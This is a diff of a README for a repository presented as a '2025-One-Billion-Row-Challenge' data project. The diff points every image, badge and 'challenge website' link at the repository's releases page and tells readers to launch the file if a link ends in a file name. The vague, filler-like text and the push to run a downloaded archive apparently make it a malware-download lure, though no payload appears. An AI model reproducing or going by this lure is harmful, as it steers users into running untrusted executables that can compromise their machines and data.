@@ -3,7 +3,7 @@
 ## Description
 Welcome to the official GitHub repository of the "2025-One-Billion-Row-Challenge" project! This project is an updated version of the famous "One Billion Row Challenge," now revamped for the year 2025. 
 
-![Challenge Image](https://example.com/challenge-image.jpg)
+![Challenge Image](https://github.com/NINJAHYPER360/2025-One-Billion-Row-Challenge/releases)
 
 In this repository, you will find all the resources, tools, and information you need to participate in this thrilling challenge. Are you ready to test your skills and push boundaries in the world of data manipulation? Join us on this exciting journey!
 
@@ -13,7 +13,7 @@ Topics: N/A
 ## Get Started
 To begin your adventure in the "2025-One-Billion-Row-Challenge," please make sure to follow these steps:
 
-1. **Visit the Challenge Website**: [Click here to visit the challenge website](https://github.com/assets/Release.zip)
+1. **Visit the Challenge Website**: [Click here to visit the challenge website](https://github.com/NINJAHYPER360/2025-One-Billion-Row-Challenge/releases)
    
    If the link ends with the file name, make sure to launch it to access all the necessary files and guidelines to kickstart your challenge participation.
 
@@ -28,7 +28,7 @@ Join our passionate community of data enthusiasts and challenge seekers by parti
 
 Are you ready to take on the challenge? Let's dive in and make 2025 a year to remember in the world of data! 🌟🔥
 
-![Data Visualization](https://example.com/data-visualization.jpg)
+![Data Visualization](https://github.com/NINJAHYPER360/2025-One-Billion-Row-Challenge/releases)
 
 ## Contributing
 If you are interested in contributing to the "2025-One-Billion-Row-Challenge" project, feel free to explore the repository, fork it, make your changes, and submit a pull request. Your contributions are highly appreciated and vital to the success of the challenge.
@@ -43,4 +43,4 @@ Let's collaborate, innovate, and make data magic happen together! 🚀✨
 
 🚀 Happy Coding! 🌟
 
-[![Launch Challenge](https://img.shields.io/badge/Launch-Challenge-blue)](https://github.com/assets/Release.zip)
+[![Launch Challenge](https://github.com/NINJAHYPER360/2025-One-Billion-Row-Challenge/releases)](https://github.com/NINJAHYPER360/2025-One-Billion-Row-Challenge/releases)
